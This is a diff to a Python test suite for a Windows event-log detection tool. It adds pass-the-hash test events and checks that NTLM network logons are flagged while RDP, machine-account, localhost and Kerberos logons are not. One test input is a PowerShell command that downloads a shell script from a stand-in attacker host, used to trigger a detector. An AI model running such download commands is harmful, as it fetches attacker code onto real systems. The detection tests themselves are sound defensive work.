@@ -31,6 +31,7 @@ from pulse.detections import (
     detect_av_disabled,
     detect_service_installed,
     detect_rdp_logon,
+    detect_pass_the_hash,
     detect_account_lockout,
     detect_scheduled_task_created,
     detect_suspicious_powershell,
@@ -334,6 +335,38 @@ def make_rdp_logon_event(username, logon_type="10", timestamp="2024-01-15T15:00:
     return {"event_id": 4624, "timestamp": timestamp, "data": xml}
 
 
+def make_pth_event(username, source_ip="192.168.1.50", timestamp="2024-01-15T15:05:00.000Z"):
+    """
+    Builds a fake Event 4624 with Pass-the-Hash indicators.
+
+    The three tell-tale fields that distinguish PtH from a normal logon:
+      - LogonType = 3 (network logon)
+      - AuthenticationPackageName = NTLM
+      - LogonProcessName = NtLmSsp
+
+    Parameters:
+        username (str):   The account that was used.
+        source_ip (str):  Where the connection came from.
+        timestamp (str):  When it happened.
+    """
+    xml = (
+        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
+        "  <System>"
+        "    <EventID>4624</EventID>"
+        f'    <TimeCreated SystemTime="{timestamp}" />'
+        "  </System>"
+        "  <EventData>"
+        f'    <Data Name="TargetUserName">{username}</Data>'
+        '    <Data Name="LogonType">3</Data>'
+        '    <Data Name="AuthenticationPackageName">NTLM</Data>'
+        '    <Data Name="LogonProcessName">NtLmSsp </Data>'
+        f'    <Data Name="IpAddress">{source_ip}</Data>'
+        "  </EventData>"
+        "</Event>"
+    )
+    return {"event_id": 4624, "timestamp": timestamp, "data": xml}
+
+
 # ===========================================================================
 # BRUTE FORCE TESTS (time-windowed)
 # ===========================================================================
@@ -571,6 +604,83 @@ def test_rdp_logon_ignores_other_event_ids():
     events = [make_user_created_event("newguy", "admin")]
 
     findings = detect_rdp_logon(events)
+
+    assert len(findings) == 0
+
+
+# ===========================================================================
+# PASS-THE-HASH TESTS
+# ===========================================================================
+
+def test_pth_flags_ntlm_network_logon():
+    """A type-3 NTLM logon via NtLmSsp from an external IP should be flagged."""
+    events = [make_pth_event("jsmith", source_ip="10.0.0.55")]
+
+    findings = detect_pass_the_hash(events)
+
+    assert len(findings) == 1
+    assert findings[0]["rule"] == "Pass-the-Hash Attempt"
+    assert findings[0]["severity"] == "HIGH"
+    assert "jsmith" in findings[0]["details"]
+    assert "10.0.0.55" in findings[0]["details"]
+
+
+def test_pth_ignores_rdp_logon():
+    """LogonType 10 (RDP) should not be flagged as PtH."""
+    events = [make_rdp_logon_event("jsmith", logon_type="10")]
+
+    findings = detect_pass_the_hash(events)
+
+    assert len(findings) == 0
+
+
+def test_pth_ignores_machine_accounts():
+    """Machine accounts (ending in $) are normal NTLM traffic, not PtH."""
+    events = [make_pth_event("WORKSTATION01$")]
+
+    findings = detect_pass_the_hash(events)
+
+    assert len(findings) == 0
+
+
+def test_pth_ignores_localhost():
+    """Connections from 127.0.0.1 are internal processes, not PtH."""
+    events = [make_pth_event("jsmith", source_ip="127.0.0.1")]
+
+    findings = detect_pass_the_hash(events)
+
+    assert len(findings) == 0
+
+
+def test_pth_ignores_kerberos():
+    """Kerberos logons (AuthenticationPackageName = Kerberos) should not be flagged."""
+    xml = (
+        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
+        "  <System>"
+        "    <EventID>4624</EventID>"
+        '    <TimeCreated SystemTime="2024-01-15T15:05:00.000Z" />'
+        "  </System>"
+        "  <EventData>"
+        '    <Data Name="TargetUserName">jsmith</Data>'
+        '    <Data Name="LogonType">3</Data>'
+        '    <Data Name="AuthenticationPackageName">Kerberos</Data>'
+        '    <Data Name="LogonProcessName">Kerberos</Data>'
+        '    <Data Name="IpAddress">10.0.0.55</Data>'
+        "  </EventData>"
+        "</Event>"
+    )
+    events = [{"event_id": 4624, "timestamp": "2024-01-15T15:05:00.000Z", "data": xml}]
+
+    findings = detect_pass_the_hash(events)
+
+    assert len(findings) == 0
+
+
+def test_pth_ignores_other_event_ids():
+    """Non-4624 events should be ignored."""
+    events = [make_failed_login_event("admin")]
+
+    findings = detect_pass_the_hash(events)
 
     assert len(findings) == 0
 
@@ -1018,12 +1128,14 @@ def test_run_all_detections_combines_results():
         + [make_scheduled_task_event("\\Updater", "admin")]
         # suspicious PowerShell — triggers PowerShell detection
         + [make_powershell_event("Invoke-WebRequest -Uri http://evil.com/shell.ps1")]
+        # pass-the-hash — type 3, NTLM, NtLmSsp, external IP
+        + [make_pth_event("admin", source_ip="10.0.0.55")]
     )
 
     findings = run_all_detections(events)
 
-    # We expect 14 findings: 12 individual rules + 2 chain detections.
-    assert len(findings) == 14
+    # We expect 15 findings: 13 individual rules + 2 chain detections.
+    assert len(findings) == 15
 
     rule_names = set(f["rule"] for f in findings)
     assert rule_names == {
@@ -1032,6 +1144,7 @@ def test_run_all_detections_combines_results():
         "Privilege Escalation",
         "Audit Log Cleared",
         "RDP Logon Detected",
+        "Pass-the-Hash Attempt",
         "Service Installed",
         "Antivirus Disabled",
         "Firewall Disabled",
